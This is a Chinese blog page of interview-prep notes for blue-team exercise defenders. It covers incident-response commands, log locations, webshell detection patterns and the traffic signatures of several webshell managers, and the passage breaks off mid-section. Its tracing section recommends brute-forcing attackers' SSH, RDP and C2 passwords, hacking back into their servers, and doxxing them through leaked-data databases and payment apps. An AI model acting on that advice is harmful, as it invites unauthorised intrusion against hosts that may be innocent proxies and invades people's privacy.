@@ -1,0 +1,559 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HVV中级常见面试问题 | Drblack'Blog</title><meta name="author" content="Drblack"><meta name="copyright" content="Drblack"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="整理人：Drblack linux常用命令12345678910111213141516find 查找与文本操作   grep 命令用于查找文件里符合条件的字符串。strings 打印文件中可打印的字符 head  显示文件默认前10行内容 more 类似于more 但是一页一页的显示tail 命令可用于查看文件的内容， -f 常用于查阅正在改变的日志文件。lsof 查看指定用户启动的进程   -">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HVV中级常见面试问题">
+<meta property="og:url" content="https://drblack000.github.io/2023/05/21/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/index.html">
+<meta property="og:site_name" content="Drblack&#39;Blog">
+<meta property="og:description" content="整理人：Drblack linux常用命令12345678910111213141516find 查找与文本操作   grep 命令用于查找文件里符合条件的字符串。strings 打印文件中可打印的字符 head  显示文件默认前10行内容 more 类似于more 但是一页一页的显示tail 命令可用于查看文件的内容， -f 常用于查阅正在改变的日志文件。lsof 查看指定用户启动的进程   -">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://drblack000.github.io/img/1000.webp">
+<meta property="article:published_time" content="2023-05-21T11:01:41.000Z">
+<meta property="article:modified_time" content="2023-09-10T13:07:32.499Z">
+<meta property="article:author" content="Drblack">
+<meta property="article:tag" content="知识点">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://drblack000.github.io/img/1000.webp"><link rel="shortcut icon" href="/img/1000.webp"><link rel="canonical" href="https://drblack000.github.io/2023/05/21/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="8KYdLccZEOQiOgJvHftvX7-2pkkmhBMvMXO4inbIkLw"/><meta name="baidu-site-verification" content="codeva-t56Dl5qqYL"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HVV中级常见面试问题',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-09-10 21:07:32'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.3.0"></head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+document.addEventListener('pjax:send', () => {
+  Pace.restart()
+})
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1000.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><i class="fa-fw sitemap"></i><span> sitemap</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Drblack'Blog"><span class="site-name">Drblack'Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><i class="fa-fw sitemap"></i><span> sitemap</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HVV中级常见面试问题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-21T11:01:41.000Z" title="发表于 2023-05-21 19:01:41">2023-05-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-10T13:07:32.499Z" title="更新于 2023-09-10 21:07:32">2023-09-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">10.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>32分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HVV中级常见面试问题"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>整理人：Drblack</p>
+<h3 id="linux常用命令"><a href="#linux常用命令" class="headerlink" title="linux常用命令"></a><strong>linux常用命令</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">find 查找与文本操作   </span><br><span class="line">grep 命令用于查找文件里符合条件的字符串。</span><br><span class="line">strings 打印文件中可打印的字符 </span><br><span class="line">head  显示文件默认前10行内容 </span><br><span class="line">more 类似于more 但是一页一页的显示</span><br><span class="line">tail 命令可用于查看文件的内容， -f 常用于查阅正在改变的日志文件。</span><br><span class="line">lsof 查看指定用户启动的进程   -i :3306 # 查看谁在使用某个端口  -nPi 查看内部对外的网络连接</span><br><span class="line">lastlog 最后一次登录 lastb 登录失败记录 last 登陆成功记录 </span><br><span class="line">netstat  查看网络进程 命令用于显示各种网络相关信息，如网络连接，路由表，接口状态 a参数是列出所有连接，n是不要解析机器名，p列出进程名 </span><br><span class="line">rm 删除操作</span><br><span class="line">who 查看当前用户</span><br><span class="line">w 查看系统信息，知道某一时刻用户行为</span><br><span class="line">uptime 查看登陆了多久，多少用户</span><br><span class="line">pstree命令，该命令以树状图的方式展现进程之间的派生关系</span><br><span class="line">ps 列出进程信息，快照   </span><br><span class="line">top命令 实时显示各个线程情况</span><br></pre></td></tr></table></figure>
+
+<h3 id="应急响应linux"><a href="#应急响应linux" class="headerlink" title="应急响应linux"></a>应急响应linux</h3><p>应急思路：首先通过安全设备拦截攻击包体和日志分析，了解攻击者具体进行了什么样的攻击，通过黑白结合模拟方法进一步判断攻击者的攻击方式。复现之后对漏洞进行修复，对攻击者进行溯源。</p>
+<p>1.<strong>查看History详细信息</strong></p>
+<p>查看命令执行记录 ~&#x2F;.bash_history分析近期是否有账户执行过恶意操作系统命令</p>
+<p>2.<strong>查看文件改动</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">find ./ -mtime 0 -name &quot;*.php&quot; </span><br><span class="line"></span><br><span class="line">检查最近创建的php、jsp文件和上传目录 例如要查找24小时内被修改的JSP文件： </span><br><span class="line"></span><br><span class="line">stat /etc/passwd #查看密码文件上一次修改的时间，如果最近被修改过，那就可能存在问题。 </span><br><span class="line"></span><br><span class="line">cat /etc/passwd | grep -v nologin #查看除了不可登录以外的用户都有哪些，有没有新增的 </span><br><span class="line"></span><br><span class="line">cat /etc/passwd | grep x:0 #查看哪些用户为root权限，有没有新增的 </span><br></pre></td></tr></table></figure>
+
+<p>3.<strong>账号</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、查询特权用户特权用户(uid 为0) </span><br><span class="line"></span><br><span class="line">awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd </span><br><span class="line"></span><br><span class="line">2、查询可以远程登录的帐号信息 </span><br><span class="line"></span><br><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow </span><br></pre></td></tr></table></figure>
+
+<p>4.<strong>域名hosts</strong></p>
+<p>有一些挖矿程序会修改 &#x2F;etc&#x2F;hosts文件，请看一下其中内容是否被更改过</p>
+<p>5.<strong>各类日志</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分析安全日志 /var/log/secure查看是否有IP爆破成功</span><br></pre></td></tr></table></figure>
+
+
+<ul>
+<li>分析&#x2F;var&#x2F;spool&#x2F;mail&#x2F;root Root邮箱，当日志被删除可查询本文件</li>
+<li>分析中间件、Web日志，如access_log文件</li>
+<li>调用命令last&#x2F;lastb翻阅登录日志</li>
+<li>lsof -i :3306 # 查看谁在使用某个端口</li>
+<li>分析&#x2F;var&#x2F;log&#x2F;cron文件查看历史计划任务</li>
+<li>分析redis、sql server、mysql、oracle等日志文件</li>
+</ul>
+<p>6.<strong>进程排查：</strong></p>
+<ul>
+<li>查找进程pid</li>
+<li>netstat -antlp    # 检查当前存在的连接与监听端口    </li>
+<li>lsof -i:port      定位可疑进程pid</li>
+<li>通过pid查找文件</li>
+<li>cd &#x2F;proc&#x2F;pid号    即可进入到该进程目录中ls -ail   结果中exe对应的就是该pid程序的目录ls -ail |grep exe</li>
+<li>查看各进程占用的内存和cpu <code>top</code></li>
+<li>显示当前进程信息 <code>ps</code></li>
+<li>实现某个进程的精确查找 <code>ps -ef | grep apache</code></li>
+<li>结束进程 <code>kill -9 pid</code></li>
+<li>查看进程树 <code>pstree -p</code> 查找异常进程是否有父进程</li>
+<li>也可以直接搜索异常进程的名程来查找其位置， <code>find / -name &#39;xxx&#39;</code></li>
+</ul>
+<p>7.<strong>准备查后门的工具</strong>   </p>
+<p>D盾  河马查杀   </p>
+<p>8.<strong>清理处置</strong>：杀掉异常进程，删除异常文件，打补丁或者修复相关文件等。</p>
+<p> 9.<strong>产出报告</strong>：对此次安全事件进行一个完整的文档描述。</p>
+<h3 id="应急响应windows"><a href="#应急响应windows" class="headerlink" title="应急响应windows"></a>应急响应windows</h3><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a><strong>日志分析</strong></h3><p><strong>1、安全日志 &#x2F;var&#x2F;log&#x2F;secure</strong></p>
+<p>作用：安全日志secure包含验证和授权方面信息</p>
+<p>分析：是否有IP爆破成功</p>
+<p><strong>2、用户信息 &#x2F;etc&#x2F;passwd</strong></p>
+<p>内容含义：注册名、口令、用户标识号、组标识号、用户名、用户主目录、命令解释程序  </p>
+<p>分析：是否存在攻击者创建的恶意用户</p>
+<p><strong>3、命令执行记录 ~&#x2F;.bash_history</strong></p>
+<p>作用：命令执行记录 ~&#x2F;.bash_history</p>
+<p>分析：是否有账户执行过恶意操作系统命令</p>
+<p><strong>4、root邮箱 &#x2F;var&#x2F;spool&#x2F;mail&#x2F;root</strong></p>
+<p>作用：root邮箱 &#x2F;var&#x2F;spool&#x2F;mail&#x2F;root</p>
+<p>分析：root邮箱的一个文件，在该文件中包含大量信息，当日志被删除可查询本文件</p>
+<p><strong>5、中间件日志(Web日志access_log)</strong>  </p>
+<p>nginx、apache、tomcat、jboss、weblogic、websphere</p>
+<p><strong>6.登陆日志（可直接使用命令调取该信息，对应命令last&#x2F;lastb）</strong></p>
+<p>位置：&#x2F;var&#x2F;log&#x2F;wtmp #成功连接的IP信息</p>
+<p>位置：&#x2F;var&#x2F;log&#x2F;btmp #连接失败的IP信息</p>
+<p><strong>7.cron(定制任务日志)日志</strong></p>
+<p>位置：&#x2F;var&#x2F;log&#x2F;cron</p>
+<p>作用：查看历史计划任务（对该文件进行分析调取恶意病毒执行的计划任务，获取准确时间）</p>
+<p><strong>8、history日志</strong></p>
+<p>位置：~&#x2F;.bash_history</p>
+<p>作用：操作命令记录，可筛查攻击者执行命令信息</p>
+<p><strong>9、其他日志</strong></p>
+<p>redis、sql server、mysql、oracle等</p>
+<p>作用：记录访问信息</p>
+<p>分析：敏感操作</p>
+<h3 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h3><p><strong>思路</strong></p>
+<p><strong>你本人溯源的思路</strong></p>
+<p>1.红队攻击都会挂着代理，你溯源的话只能溯源到他的代理ip，没有太大的意义，如果说服务器被上了内存马的情况，可以去工具取样他内存马的ip，对内存马ip反向扫描端口，因为他们也是通过远程进去的，去爆破他们的ssh,3389和cs的密码。</p>
+<p>2.反序列化的取样，他打shiro，里面就有他的基本设备vps，通过中间件吧这些有特征的ip收集，放到在线情报平台上识别，检测是不是有ip绑定域名的，通过whois反查他的域名注册时间、邮箱，通过社工库查他的手机号，然后通过社交软件，qq、微信、支付宝来给他转一毛钱，拼接他的个人信息。</p>
+<p>首先通过系统日志、安全设备截获攻击包等从中分析出攻击者的ip和攻击方式，通过webshell或者木马去微步分析，或者去安恒威胁情报中心进行ip检测分析，是不是云服务器，基站等，如果是云服务器的话可以直接反渗透，看看开放端口，域名，whois等进行判断，获取姓名电话等丢社工库看看能不能找到更多信息然后收工</p>
+<p><img src="/images/image-20230522162854408.png" alt="image-20230522162854408"></p>
+<p><strong>取证工具</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PC Hunter      Windows系统信息查看软件，也是手工杀毒辅助软件。软件可以查看内核文</span><br><span class="line">件、驱动模块、隐藏进程、注册表等等信息</span><br><span class="line"></span><br><span class="line">火绒剑         软件监控，分析样本行为的软件</span><br></pre></td></tr></table></figure>
+
+<p><strong>反制溯源工具准备</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Railgun：集成了端口扫描、端口爆破、web指纹扫描、漏洞扫描、漏洞</span><br><span class="line">利用以及编码转换功能，大批量多线程端口扫描对HW反制工作较为友</span><br><span class="line">好。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.检测到异常邮件，上报并与指挥部确认是否发送该邮件</span><br><span class="line">2.封禁该发件人，登陆反垃圾邮件网关查询同主题邮件溯源</span><br><span class="line">3.通过分析主动截获的邮件头，查找来信IP</span><br><span class="line">4.根据发送来的附件进行分析。看是否有回连的情况</span><br><span class="line">5.然后查看接受邮件的主机，进行取证</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.设备告警，发现IP对目标域控主机发起域控发起账户名枚举</span><br><span class="line">2.封堵ip</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.存在可疑告警，提取可疑流量并上报研判人员；研判人员分析后启动事件响应并提取攻击ip；</span><br><span class="line">2.分析ip的流量，查看其异常操作，比如sql注入</span><br><span class="line">3.如果被上传了xxshell，用防火墙封堵ip并删除恶意文件。</span><br><span class="line">4.事件上报指挥部</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>反制</strong></p>
+<p>首先可以通过安全设备查到攻击ip，然后通过相关网站反查手机号和邮箱，之后可以通过社交软件或购物平台描绘出攻击者画像。</p>
+<p>   常用反查网站有ipwhois.cnnic,ip.tool.chinaz,chaipip.com等。</p>
+<p><img src="/images/image-20220107173039804.png" alt="image-20220107173039804"></p>
+<p><strong>常规溯源流程：</strong></p>
+<p>第一步：利用各大安全社区情报如微步、360、绿盟确认此IP是否有溯源价值，第二步：收集此IP开放的端口是否有利用、并查询此IP定位，第三步：社工收集，如发现攻击者的网络圈子ID或手机号，可通过不限于百度、谷歌、SRC信息、微博、贴吧、支付宝、tg社工库等手段收集信息、第四步：如果有蜜罐设备，则分析蜜罐设备日志，如长亭谛听</p>
+<h3 id="误报"><a href="#误报" class="headerlink" title="误报"></a>误报</h3><p>机器一般他报告里面都会把攻击者的命令，木马文件啥的都写出来，还会生成一个md5，可以在病毒库里面对照md5看看是不是误报，还可以看看命令是不是攻击命令，有可能是管理员在操作，一些危险操作比如创建用户，上传文件啥的就要向上面判断去确认是不是管理员在操作，不是就说明被攻击了。也可以看到木马文件的内容，如果里面是一句话那肯定就不是误报。</p>
+<h3 id="寻找Webshell的方法"><a href="#寻找Webshell的方法" class="headerlink" title="寻找Webshell的方法"></a>寻找Webshell的方法</h3><p>1、文件内容中的恶意函数</p>
+<blockquote>
+<p> PHP：eval(、system(、assert(</p>
+<p> JSP：getRunTime(、 FileOutputStream(</p>
+<p> ASP：eval(、execute(、 ExecuteGlobal（</p>
+</blockquote>
+<p>2、Web日志中的webshell特征</p>
+<blockquote>
+<p> Darkblade：goaction&#x3D;login</p>
+<p> JspSpy：o&#x3D;login</p>
+<p> PhpSpy：action&#x3D;phpinfo</p>
+<p> Regeorg：cmd&#x3D;connect</p>
+<p> Other：cmd&#x3D;</p>
+</blockquote>
+<p>3、贴合Web业务中的url来分析Web日志</p>
+<p>4、每天新增的动态脚本文件</p>
+<p>5、低频访问的脚本文件</p>
+<h3 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h3><p>base64编码  </p>
+<p>有一些关键代码没有被加密，容易被识别</p>
+<p>1、eval执行php代码<br>2、base64_decode($POST[z0]) ; 设置payload的编码方式<br>3、&amp;z0&#x3D;… 是攻击载荷</p>
+<p>菜刀会伪造 XFF 头，且每一次利用菜刀与webshell建立连接，XFF 都会变化。</p>
+<p><img src="/images/image-20230522162913498.png" alt="image-20230522162913498"></p>
+<h3 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h3><p>默认是<strong>URL编码</strong></p>
+<p><strong>流量特征</strong></p>
+<p>因为蚁剑在数据包中实际上是将解码函数一同发送到服务端，那几个<strong>解码函数</strong>是没法加密的，所以产生一个很明显的流量特征。</p>
+<p>data中含有<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);</code> ，<strong>header中含有antSword字眼</strong></p>
+<p><img src="/images/image-20230522162925101.png" alt="image-20230522162925101"></p>
+<h3 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h3><p>对称加密</p>
+<p><strong>冰蝎2流量特征</strong></p>
+<ul>
+<li>2.0中采用协商密钥机制。<strong>第一阶段请求中返回包状态码为200，返回内容必定是16位的密钥</strong></li>
+<li>Accept: text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, <em>; q&#x3D;.2,</em> &#x2F;*; q&#x3D;.2</li>
+<li>建立连接后 所有请求 Cookie的格式都为: Cookie: PHPSESSID&#x3D;; path&#x3D;&#x2F;；</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ACCEPT字段:冰蝎2默认Accept字段的值很特殊 </span><br><span class="line"></span><br><span class="line">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="line"></span><br><span class="line">UA字段:冰蝎内置了十余种 UserAgent ，每次连接 shell 会随机选择一个进行使用。但都是比较老的，容易被检测到，但是可以在burp中修改ua头。  *UserAgent可由黑客自定义，因此该特征可能会被绕过</span><br><span class="line"></span><br><span class="line">Content-Length: 16, 16就是冰蝎2连接的特征</span><br></pre></td></tr></table></figure>
+
+<p><strong>冰蝎3</strong></p>
+<p>冰蝎3.0 取消动态密钥获取</p>
+<p>新增了无动态密钥交互。只有在无动态密钥交互失败后，才会进入常规的密钥交互阶段。密钥生成可以看出，使用密码的md5结果的前16位</p>
+<p><strong>冰蝎3流量特征</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">特征分析：</span><br><span class="line">弱特征</span><br><span class="line">长连接（可绕过）</span><br><span class="line">冰蝎通讯默认使用长连接，避免了频繁的握手造成的资源开销。因此默认情况下，请求头和响应头里都会带有:</span><br><span class="line">Connection: Keep-Alive    </span><br><span class="line"></span><br><span class="line">弱特征</span><br><span class="line">user-Agent头  默认16个userAgent</span><br><span class="line"></span><br><span class="line">强特征</span><br><span class="line">1.请求包中content-length 为5740或5720</span><br><span class="line">2.Content-Type: application/octet-stream属于强特征 意思是，只能提交二进制</span><br><span class="line">3.传递的密钥  强特征</span><br><span class="line">加密所用密钥是长度为16的随机字符串，小写字母+数字组成。密钥传递阶段，密钥存在于Response Body</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a><strong>哥斯拉</strong></h3><p>特征：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.User-Agent (弱特征)</span><br><span class="line">哥斯拉客户端使用JAVA语言编写，在默认的情况下，如果不修改User-Agent，User-Agent会类似于Java/1.8.0_121（具体什么版本取决于JDK环境版本）。</span><br><span class="line"></span><br><span class="line">2.Accept（弱特征）</span><br><span class="line">Accept为text/html, image/gif, image/jpeg, *; q=.2, /; q=.2</span><br><span class="line">对这个默认特征应该很熟悉了，之前冰蝎也出现过同样的Accept。为什么会这么巧合出现两个工具都会出现这个特征呢，其实这个也是JDK引入的一个特征，并不是作者自定义的Accept（参考：https://bugs.openjdk.java.net/browse/JDK-8177439）。同样的这个默认特征也可以通过自定义头部去除，只能作为默认情况下的辅助检测特征。</span><br><span class="line"></span><br><span class="line">3.Cookie (强特征)</span><br><span class="line">在请求包的Cookie中最后的分号。标准的HTTP请求中最后一个Cookie的值是不应该出现;的</span><br><span 